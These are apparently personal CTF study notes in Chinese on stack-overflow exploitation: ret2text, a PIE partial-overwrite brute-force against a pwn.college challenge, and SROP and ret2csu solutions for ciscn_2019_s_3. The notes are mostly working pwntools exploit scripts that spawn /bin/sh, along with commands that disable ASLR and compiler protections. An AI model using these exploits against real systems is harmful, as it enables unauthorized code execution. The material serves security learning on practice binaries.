### 栈溢出

#### test ret2textWithParams x86

* 这里在栈上注入字符串失败，因为在后续栈的使用中被覆盖，改用内存中搜索到的字符串

```c
// example
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> 
char sh[]="/bbbbbbbbbbbbbbin/sh"; 

int init_func(){
	setvbuf(stdin,0,2,0); 
	setvbuf(stdout,0,2,0); 
	setvbuf(stderr,0,2,0); 
	return 0;
}

int func(char *cmd){ 
	system(cmd); 
	return 0; 
}

int main(){ 
	init_func(); 
	char a[32] ={}; 
	puts("input: ");
	gets(a);
	printf(a); 
	return 0; 
}
```

```shell
# 关闭PIE NX STACK CANARY
gcc -m32 -no-pie -fno-pie -fno-stack-protector -z execstack program.c -o program

# 查看ASLR是否开启，现代操作系统默认开启了 ASLR，这会导致每次程序运行时，栈、堆、库函数（如 libc）、程序本身的数据段/代码段 的地址都可能会变化，难以确定注入栈上注入的shellcode的地址
cat  /proc/sys/kernel/randomize_va_space

# 临时关闭ASLR，重启后恢复
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

```python
from pwn import *

context(log_level='debug',arch='i386', os='linux')
context.binary = '/home/lideao/C/retShellcode32'
context.terminal = ['gnome-terminal', '--']  # 或 tmux 等

io = process()
gdb.attach(io, '''
    b main
    b *main+136
    c
''')

esp = b'\xb0\xc9\xff\xff'

cmd = b'' # 这里注入易被覆盖
nop = b'\x00'*(32-len(cmd)+4)
oldrsp = bytes([esp[0]+0x30])+esp[1:]
oldrbp = b'\x00'*4
retIp = b'\x63\x92\x04\x08'
nopCallip = b'\x00'*4
# paramPoint指向内存中搜索到的字符串
paramPoint = b'\x26\xcc\xff\xff'



print("wait...")
# 等待程序跑到输入处
print("exe echo:\n"+io.recvuntil(b'input: ').decode())

pause()

payload = cmd + nop + oldrsp + oldrbp + retIp + nopCallip + paramPoint
# payload = b'aaaaa'
print("start send payload......")
io.sendline(payload)
print("send success!")

io.interactive()

```

#### pwn.college PIE ret2text x64

* 开启了PIE，需要ret到win()

```c
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <libgen.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/signal.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/sendfile.h>
#include <sys/prctl.h>
#include <sys/personality.h>
#include <arpa/inet.h>

uint64_t sp_;
uint64_t bp_;
uint64_t sz_;
uint64_t cp_;
uint64_t cv_;
uint64_t si_;
uint64_t rp_;

#define GET_SP(sp) asm volatile ("mov %0, rsp" : "=r"(sp) : : );
#define GET_BP(bp) asm volatile ("mov %0, rbp" : "=r"(bp) : : );
#define GET_CANARY(cn) asm volatile ("mov %0, QWORD PTR [fs:0x28]" : "=r"(cn) : : );
#define GET_FRAME_WORDS(sz_, sp, bp, rp_) GET_SP(sp); GET_BP(bp); sz_ = (bp-sp)/8+2; rp_ = bp+8;
#define FIND_CANARY(cnp, cv, start)                                     \
  {                                                                     \
    cnp = start;                                                        \
    GET_CANARY(cv);                                                     \
    while (*(uint64_t *)cnp != cv) cnp = (uint64_t)cnp - 8;   \
  }

void DUMP_STACK(uint64_t sp, uint64_t n)
{
    printf("+---------------------------------+-------------------------+--------------------+\n");
    printf("| %31s | %23s | %18s |\n", "Stack location", "Data (bytes)", "Data (LE int)");
    printf("+---------------------------------+-------------------------+--------------------+\n");
    for (si_ = 0; si_ < n; si_++)
    {
        printf("| 0x%016lx (rsp+0x%04x) | %02x %02x %02x %02x %02x %02x %02x %02x | 0x%016lx |\n",
               sp+8*si_, 8*si_,
               *(uint8_t *)(sp+8*si_+0), *(uint8_t *)(sp+8*si_+1), *(uint8_t *)(sp+8*si_+2), *(uint8_t *)(sp+8*si_+3),
               *(uint8_t *)(sp+8*si_+4), *(uint8_t *)(sp+8*si_+5), *(uint8_t *)(sp+8*si_+6), *(uint8_t *)(sp+8*si_+7),
               *(uint64_t *)(sp+8*si_)
              );
    }
    printf("+---------------------------------+-------------------------+--------------------+\n");
}

void bin_padding()
{
    asm volatile (".rept 1153; nop; .endr");
}

void win_authed(int token)
{
    static char flag[256];
    static int flag_fd;
    static int flag_length;

    if (token != 0x1337) return;

    puts("You win! Here is your flag:");
    flag_fd = open("/flag", 0);
    if (flag_fd < 0)
    {
        printf("\n  ERROR: Failed to open the flag -- %s!\n", strerror(errno));
        if (geteuid() != 0)
        {
            printf("  Your effective user id is not 0!\n");
            printf("  You must directly run the suid binary in order to have the correct permissions!\n");
        }
        exit(-1);
    }
    flag_length = read(flag_fd, flag, sizeof(flag));
    if (flag_length <= 0)
    {
        printf("\n  ERROR: Failed to read the flag -- %s!\n", strerror(errno));
        exit(-1);
    }
    write(1, flag, flag_length);
    printf("\n\n");
}

int challenge(int argc, char **argv, char **envp)
{
    struct
    {
        char input[99];
    } data  = {0} ;

    unsigned long size = 0;

    puts("The challenge() function has just been launched!");

    GET_FRAME_WORDS(sz_, sp_, bp_, rp_);
    puts("Before we do anything, let's take a look at challenge()'s stack frame:");
    DUMP_STACK(sp_, sz_);
    printf("Our stack pointer points to %p, and our base pointer points to %p.\n", sp_, bp_);
    printf("This means that we have (decimal) %d 8-byte words in our stack frame,\n", sz_);
    printf("including the saved base pointer and the saved return address, for a\n");
    printf("total of %d bytes.\n", sz_ * 8);
    printf("The input buffer begins at %p, partway through the stack frame,\n", &data.input);
    printf("(\"above\" it in the stack are other local variables used by the function).\n");
    printf("Your input will be read into this buffer.\n");
    printf("The buffer is %d bytes long, but the program will let you provide an arbitrarily\n", 99);
    printf("large input length, and thus overflow the buffer.\n\n");

    printf("In this level, there is no \"win\" variable.\n");
    printf("You will need to force the program to execute the win_authed() function\n");
    printf("by directly overflowing into the stored return address back to main,\n");
    printf("which is stored at %p, %d bytes after the start of your input buffer.\n", rp_, rp_ - (unsigned long) &data.input);
    printf("That means that you will need to input at least %d bytes (%d to fill the buffer,\n", rp_ + 8 - (unsigned long) &data.input, 99);
    printf("%d to fill other stuff stored between the buffer and the return address,\n", rp_ - (unsigned long) &data.input - 99);
    printf("and 8 that will overwrite the return address).\n\n");

    puts("We have disabled the following standard memory corruption mitigations for this challenge:");
    puts("- the canary is disabled, otherwise you would corrupt it before");
    puts("overwriting the return address, and the program would abort.");

    size = 4096;

    printf("You have chosen to send %lu bytes of input!\n", size);
    printf("This will allow you to write from %p (the start of the input buffer)\n", &data.input);
    printf("right up to (but not including) %p (which is %d bytes beyond the end of the buffer).\n", size + (unsigned long) &data.input, size - 99);

    printf("Of these, you will overwrite %d bytes into the return address.\n", (long)((unsigned long) &data.input + size - rp_));
    printf("If that number is greater than 8, you will overwrite the entire return address.\n\n");

    puts("One caveat in this challenge is that the win_authed() function must first auth:");
    puts("it only lets you win if you provide it with the argument 0x1337.");
    puts("Speifically, the win_authed() function looks something like:");
    puts("    void win_authed(int token)");
    puts("    {");
    puts("      if (token != 0x1337) return;");
    puts("      puts(\"You win! Here is your flag: \");");
    puts("      sendfile(1, open(\"/flag\", 0), 0, 256);");
    puts("      puts(\"\");");
    puts("    }");
    puts("");

    printf("So how do you pass the check? There *is* a way, and we will cover it later,\n");
    printf("but for now, we will simply bypass it! You can overwrite the return address\n");
    printf("with *any* value (as long as it points to executable code), not just the start\n");
    printf("of functions. Let's overwrite past the token check in win!\n\n");

    printf("To do this, we will need to analyze the program with objdump, identify where\n");
    printf("the check is in the win_authed() function, find the address right after the check,\n");
    printf("and write that address over the saved return address.\n\n");

    printf("Go ahead and find this address now. When you're ready, input a buffer overflow\n");
    printf("that will overwrite the saved return address (at %p, %d bytes into the buffer)\n", rp_, rp_ - (unsigned long)&data.input);
    printf("with the correct value.\n\n");

    printf("Send your payload (up to %lu bytes)!\n", size);
    int received = read(0, &data.input, (unsigned long) size);

    if (received < 0)
    {
        printf("ERROR: Failed to read input -- %s!\n", strerror(errno));
        exit(1);
    }

    printf("You sent %d bytes!\n", received);

    printf("Let's see what happened with the stack:\n\n");
    DUMP_STACK(sp_, sz_);

    printf("The program's memory status:\n");
    printf("- the input buffer starts at %p\n", &data.input);
    printf("- the saved frame pointer (of main) is at %p\n", bp_);
    printf("- the saved return address (previously to main) is at %p\n", rp_);
    printf("- the saved return address is now pointing to %p.\n", *(unsigned long*)(rp_));
    printf("- the address of win_authed() is %p.\n", win_authed);
    printf("\n");

    printf("If you have managed to overwrite the return address with the correct value,\n");
    printf("challenge() will jump straight to win_authed() when it returns.\n");
    printf("Let's try it now!\n\n", 0);

    if (received + ((unsigned long) &data.input) > rp_ + 2)
    {
        puts("WARNING: You sent in too much data, and overwrote more than two bytes of the address.");
        puts("         This can still work, because I told you the correct address to use for");
        puts("         this execution, but you should not rely on that information.");
        puts("         You can solve this challenge by only overwriting two bytes!");
        puts("         ");
    }

    puts("Goodbye!");

    return 0;
}

int main(int argc, char **argv, char **envp)
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    char crash_resistance[0x1000];

    challenge(argc, argv, envp);

}
```

* PIE开启后，ELF文件的代码被加载进内存后，其地址将不再和文件中一致，而变为`基址地址+偏移地址（ELF中的地址）`。基质地址是页对齐的，再现代操作系统中，一般是0x1000的倍数，所以ELF加载进内存后，需要预测的某条指令的后三位地址是不变的，因此，如果我们想要预测的地址是后三位（四位）不为0，我们可以对从低到高第四位地址进行爆破（最大16次），对低四位地址进行覆盖（适用于小端法），其他情况依次类推即可。
* 这里的脚本有一点小缺陷，因为每次运行时PIE的地址都是不一定的，所以这里遍历`0~f`是没有必要的，可以仅设为范围内的任意一个值，爆破16次即可

```shell
for i in {0..9} {a..f};do
        ip="\\x${i}9"
        { printf 'a%.0s' {1..120}; printf '\x34%b' $ip; }|/challenge/binary-exploitation-pie-overflow-w|grep -A 10 "pwn.college{"
done
```

#### ciscn_2019_s_3  SROP ret2csu

* SROP解法
  * read在栈上写入 /bin/sh（也可以在bss段写入，这样反而无需泄露栈地址）
  * read溢覆盖返回地址到read，为第二次payload做准备
  * write泄露栈地址
  * ret到read后再次输入payload
  * 覆盖返回地址跳转到gadgets，设置rax
  * 覆盖gadgets()的返回地址指向syscall
  * 伪造sigframe

```python
from pwn import *

context(log_level='debug',arch='amd64', os='linux')
elfpath = '/home/lideao/C/ciscn_s_3'
context.binary = elfpath
context.terminal = ['tmux', 'splitw', '-h']
io=process()
elf = ELF(elfpath)
# io=gdb.debug(elfpath,'''
#     b main
#     b *0x400519
#     c
# ''')


write_addr = 0x4004f1
payload1 = flat(
    {0x00:b'/bin/sh\x00',
    ( 0x7fffffffe380-0x7fffffffe370) : write_addr}
)
io.send(payload1)
recv=io.recv()[32:40]
print(b"addr:"+recv)
stack_addr = u64(recv)
bin_sh_addr = stack_addr - 0x128

gadget_addr = 0x00000000004004DA
syscall = 0x400501
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = bin_sh_addr
sigframe.rsi = 0x0
sigframe.rdx = 0x0
sigframe.rip = syscall

payload2 = flat(
    {0x10:gadget_addr,0x18:syscall},
    bytes(sigframe)
)
pause()
io.send(payload2)
io.interactive()


```

* ret2csu1（思路错误，ret2csu只能控制edi，站上地址四位无法表示，故无法使使得rdi指向栈上/bin/sh）
  * 在栈上写入/bin/sh和syscall的地址，需要泄露地址
  * ret2 函数返回值为0x3b
  * ret2csu设置前三个寄存器，设置r12+rbx*8指向buf上的syscall地址
  * call syscall执行
* ret2csu2
  * 在栈上写入/bin/sh的地址，需要泄露地址
  * ret2 write再次写入pop rdi;ret的地址
  * ret2 函数返回值为0x3b
  * ret2csu设置rsi rdx，设置r12+rbx*8指向buf上的pop rdi;ret地址
  * pop出call push进的地址
  * ret到pop rdi;ret 
  * pop rdi
  * ret 到syscall执行

```python
from pwn import *

context(log_level='debug',arch='amd64', os='linux')
elfpath = '/home/lideao/C/ciscn_s_3'
context.binary = elfpath
context.terminal = ['tmux', 'splitw', '-h']
io=process()
elf = ELF(elfpath)
rop=ROP(elfpath) 
# io=gdb.debug(elfpath,'''
#     b main
#     b *0x400519
#     c
# ''')

write_addr = 0x4004f1

payload1 = flat(
    {0x00:b'/bin/sh\x00',
    ( 0x7fffffffe380-0x7fffffffe370) : write_addr}
)
io.send(payload1)
recv=io.recv()[32:40]
print(b"addr:"+recv)
stack_addr = u64(recv)
bin_sh_addr = stack_addr - 0x128
ret_buf_addr = stack_addr - 0x120

ret_addr = rop.rdi.address  # call的地址，先将push进去的rip给pop掉，后面再pop rdi
gadget_addr=0x4004E2
csu1_addr=0x40059A
rbx=0x00
rbp=0x00
r12=ret_buf_addr
r13_rdx=0x00
r14_rsi=0x00
r15d_edi=bin_sh_addr # 后面覆盖
csu2_addr=0x400580
syscall_addr = 0x400517
pop_rdi_addr=rop.rdi.address

payload2 = flat(
    {0x00:ret_addr,0x10:gadget_addr},
    [csu1_addr,
    rbx,
    rbp,
    r12,
    r13_rdx,
    r14_rsi,
    r15d_edi,
    csu2_addr,
    pop_rdi_addr,
    bin_sh_addr,
    syscall_addr]
)
pause()
io.send(payload2)
io.interactive()

```



 
